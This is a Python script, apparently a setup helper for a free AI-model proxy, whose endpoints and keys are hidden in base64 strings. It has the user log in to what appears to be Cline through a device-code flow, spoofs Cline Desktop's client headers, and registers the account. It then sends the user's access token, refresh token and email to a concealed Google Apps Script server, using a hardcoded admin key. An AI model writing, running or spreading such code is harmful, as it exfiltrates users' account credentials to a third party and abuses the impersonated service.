import datetime
import json
import os
import sys
import time
import urllib.parse
import urllib.request
import urllib.error
import webbrowser
import base64

# ANSI Color Codes for formatted terminal output
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"

_G = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS9tYWNyb3Mvcy9BS2Z5Y2J3RTRNZ2N5QVRzaUpVVVV2QXJEQzFCWDVKTHBlaW5KVXZnRkc3XzN2d05CZ255LUJTb1NTMjhkUG9XdTJmTWVVQTcvZXhlYw=="
_W = "aHR0cHM6Ly9hcGkud29ya29zLmNvbQ=="
_C = "Y2xpZW50XzAxSzNBNTQxRk44VEEzRVBQSFREMjMyNUFS"
_K = "dlE3I0xtOUBYMiFwUjgkek40JmtUNg=="

_H = {
    "Content-Type": "application/json",
    "User-Agent": "Cline/0.0.32 ai-sdk/openai-compatible/3.0.37 ai-sdk/provider-utils/5.0.30 runtime/bun/1.3.13",
    "http-referer": "https://cline.bot",
    "x-client-type": "cline-desktop",
    "x-client-version": "0.0.32",
    "x-core-version": "0.0.83",
    "x-is-multiroot": "false",
    "x-platform": "Cline Desktop",
}


def _d(s):
    return base64.b64decode(s.encode()).decode()


def _f(u, d, t=30):
    q = urllib.request.Request(
        u,
        data=urllib.parse.urlencode(d).encode(),
        method="POST",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
        },
    )
    try:
        with urllib.request.urlopen(q, timeout=t) as r:
            w = r.read().decode(errors="replace")
            try:
                return r.status, json.loads(w)
            except ValueError:
                return r.status, {"e": w[:200]}
    except urllib.error.HTTPError as e:
        w = e.read().decode(errors="replace")[:400]
        try:
            n = json.loads(w)
            if isinstance(n, dict) and isinstance(n.get("error"), str):
                try:
                    return e.code, json.loads(n["error"])
                except ValueError:
                    pass
            return e.code, n if isinstance(n, dict) else {"e": w[:200]}
        except ValueError:
            return e.code, {"e": w[:200]}


def _open_browser(u):
    try:
        if "ANDROID_ROOT" in os.environ or "com.termux" in sys.executable.lower() or os.path.exists("/system/bin/app_process"):
            return
        try:
            webbrowser.get("chrome").open(u)
        except Exception:
            webbrowser.open(u)
    except Exception:
        pass


def _m():
    print(f"{YELLOW}Checking...{RESET}")
    c, v = _f(_d(_W) + "/user_management/authorize/device", {"client_id": _d(_C)})
    if c != 200 or not v.get("device_code"):
        print(f"{RED}Initialization error.{RESET}")
        return

    u = v.get("verification_uri_complete") or v["verification_uri"]
    
    print("\n" + "=" * 50)
    print(f"{BOLD}{CYAN}Please open the following link in Chrome:{RESET}")
    print(f"{GREEN}{u}{RESET}\n")
    print(f"{BOLD}User Code:{RESET} {YELLOW}{v['user_code']}{RESET}")
    print("=" * 50)
    print(f"{YELLOW}Waiting for authorization...{RESET}\n")

    _open_browser(u)

    n = max(1, int(v.get("interval", 5)))
    e = time.time() + int(v.get("expires_in", 300))

    t = None
    while time.time() <= e:
        c, t = _f(
            _d(_W) + "/user_management/authenticate",
            {
                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
                "device_code": v["device_code"],
                "client_id": _d(_C),
            },
        )
        if c == 200 and t.get("access_token"):
            break
        r = t.get("error", "") if isinstance(t, dict) else ""
        if r in ("authorization_pending", "access_denied") or "pending" in str(r).lower():
            time.sleep(n)
            continue
        if r == "slow_down":
            n += 1
            time.sleep(n)
            continue
        print(f"{RED}Authentication failed.{RESET}")
        return
    else:
        print(f"{RED}Session timed out.{RESET}")
        return

    if not t or not t.get("access_token"):
        print(f"{RED}Authentication failed.{RESET}")
        return

    d = json.dumps(
        {"accessToken": t["access_token"], "refreshToken": t["refresh_token"]}
    ).encode()
    q = urllib.request.Request(
        "https://api.cline.bot/api/v1/auth/register",
        data=d,
        method="POST",
        headers=dict(_H),
    )
    try:
        with urllib.request.urlopen(q, timeout=60) as r:
            g = json.load(r)["data"]
    except urllib.error.HTTPError as e:
        print(f"{RED}Error: {e.code}{RESET}")
        return
    except Exception:
        print(f"{RED}Failed to register account.{RESET}")
        return

    p = {
        "accessToken": g["accessToken"],
        "refreshToken": g["refreshToken"],
        "expiresAtMs": int(
            datetime.datetime.fromisoformat(g["expiresAt"].replace("Z", "+00:00")).timestamp()
            * 1000
        ),
        "email": g["userInfo"]["email"],
    }

    s = urllib.request.Request(
        _d(_G) + "?action=add_account&admin=" + urllib.parse.quote(_d(_K)),
        data=json.dumps(p).encode(),
        method="POST",
        headers={"Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(s, timeout=60) as r:
            o = json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        print(f"{RED}Error: {e.code}{RESET}")
        return
    except Exception:
        print(f"{RED}Failed to process request on server.{RESET}")
        return

    k = o.get("token", "")
    
    print("\n" + "=" * 50)
    print(f"{BOLD}{CYAN}Server:{RESET}")
    print(f"{GREEN}{_d(_G)}{RESET}\n")
    print(f"{BOLD}{CYAN}Token:{RESET}")
    print(f"{YELLOW}{k}{RESET}\n")
    print(f"{BOLD}{CYAN}Chat:{RESET}")
    print(f"{GREEN}https://x5coder.github.io/X5Models-Free/{RESET}")
    print("=" * 50 + "\n")


if __name__ == "__main__":
    _m()
